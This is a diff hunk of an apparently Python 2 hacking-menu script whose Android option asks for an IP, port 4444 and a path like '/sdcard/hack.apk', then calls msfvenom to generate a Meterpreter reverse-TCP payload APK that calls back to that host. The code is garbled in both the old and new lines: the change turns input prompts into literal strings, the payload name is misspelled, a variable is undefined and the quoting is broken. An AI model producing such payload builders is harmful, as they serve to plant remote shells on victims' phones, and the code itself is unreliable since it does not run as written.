@@ -45,19 +45,19 @@ def android():
     pt()
     print '\33[33;1m 'IP LOKAL'
     pt()
-    ip = raw_input ' [ip] Addreess = '
+    ip = 'raw_input ip Addreess = '
     pt()
     print '\33[33;1m ' port = 4444'
     pt()
-    port = raw_input ' [port] Number = '
+    port = 'raw_input  port Number = '
     print ''
     print 'path && Name = /sdcard/hack.apk'
     pt()
-    pay = raw_input ' [path] Name = '
+    pay = 'raw_input  path Name = '
     pt()
     print '\33[33;1m installing payload........'
     pt()
-    os.system['msfvenom -p android/meterpteter/revesrse_tcp LHOST=' + ip + 'LPORT=' + por + ' R > ' + pay]'
+    os.system('msfvenom -p android/meterpteter/revesrse_tcp LHOST=' + ip + 'LPORT=' + por + ' R > ' + pay') 
     print ''
     print '\33[33;1m succesfully '
     print ''
